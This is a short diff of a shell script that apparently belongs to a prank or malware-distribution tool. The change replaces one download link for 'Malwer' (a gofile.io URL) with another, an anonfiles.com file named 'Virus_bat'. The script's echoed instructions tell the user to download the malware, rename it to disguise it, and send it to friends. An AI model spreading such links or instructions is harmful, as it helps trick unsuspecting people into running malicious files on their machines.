@@ -15,7 +15,7 @@ sleep 5
 echo "success"
 echo
 figlet Link
-echo "Link Malwer : https://gofile.io/d/QN6ve9"
+echo "Link Malwer : https://anonfiles.com/n8B631x0y1/Virus_bat"
 echo 
 echo "Ingglish : Download the malware first (don't be afraid).
 Then change the name of the malware to what you want and send it to your friends"
